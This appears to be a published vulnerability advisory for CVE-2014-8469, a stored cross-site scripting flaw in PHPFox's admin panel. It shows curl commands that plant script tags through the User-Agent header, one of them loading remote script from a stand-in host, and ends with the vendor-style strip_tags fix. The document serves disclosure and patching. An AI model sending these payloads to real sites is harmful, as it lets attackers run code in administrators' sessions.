@@ -1,0 +1,80 @@
+# Exploit Title: PHPFox XSS AdminCP
+# Date: 2014-10-22
+# Exploit Author: Wesley Henrique Leite aka "spyk2r"
+# Vendor Homepage: http://www.moxi9.com
+# Version: All version
+# CVE : CVE-2014-8469
+
+# Response Vendor: fixed 2014-10-23 (to v4 Beta)
+
+[+] DESCRIPTION
+
+The system stores all urls accessed in a database table, below
+information in the same 'phpfox_log_session'
+
+[phpfox]> desc phpfox_log_session;
++---------------+----------------------+------+-----+---------+-------+
+|       Field         | Type         | Null | Key | Default | Extra |
++---------------+----------------------+------+-----+---------+-------+
+++++++++++ more values and
+| user_agent  | varchar(100)  | NO   |       | NULL    |       |
++---------------+----------------------+------+-----+---------+-------+
+
+the column that can be manipulated is:
+-> user_agent (100)
+
+all acess store in the system, such as bots and users wandering around the
+web site, can be seen in:
+
+AdminCP
+TOOLS > Online > Guests/Boots
+
+Output
+| IP ADDRESS   | User-Agent    |   ...
+
+knowing this, the following code was created to inject a script into the
+AdminCP with User-Agent.
+
+$ curl -A "<script src='http://www.example.com/script.js'></script>" \
+ http://www.meusite.com.br/
+
+OR
+
+$ curl -A "<script>alert(1);</script>" http://www.meusite.com.br/
+
+when any user with administrative access in.
+'AdminCP'
+TOOLS > Online > Guests/Boots
+
+we have the script running in the administrative area.
+
+
+[+] My Solution
+
+   (line 1.8)
+
+     1.1 --- a/module/core/template/default/controller/admincp/online-guest.html.php
+Tue Oct 21 10:00:11 2014 -0200
+     1.2 +++ b/module/core/template/default/controller/admincp/online-guest.html.php
+Tue Oct 21 12:28:39 2014 -0200
+     1.3 @@ -25,7 +25,7 @@
+     1.4  {foreach from=$aGuests key=iKey item=aGuest}
+     1.5   <tr class="checkRow{if is_int($iKey/2)} tr{else}{/if}">
+     1.6   <td><a href="{url link='admincp.core.ip'
+search=$aGuest.ip_address_search}" title="{phrase
+var='admincp.view_all_the_activity_from_this_ip'}">{$aGuest.ip_address}</a></td>
+     1.7 - <td>{$aGuest.user_agent}</td>
+     1.8 + <td>{$aGuest.user_agent|strip_tags}</td>
+     1.9   <td class="t_center">
+    1.10   <div class="js_item_is_active"{if !$aGuest.ban_id}
+style="display:none;"{/if}>
+    1.11   <a href="#?call=ban.ip&ip={$aGuest.ip_address}&active=0"
+class="js_item_active_link" title="{phrase var='admincp.unban'}">{img
+theme='misc/bullet_green.png' alt=''}</a>
+    1.12 @@ -43,4 +43,4 @@
+    1.13  <div class="extra_info">
+    1.14   {phrase var='admincp.no_guests_online'}
+    1.15  </div>
+    1.16 -{/if}
+    1.17 \ No newline at end of file
+    1.18 +{/if}
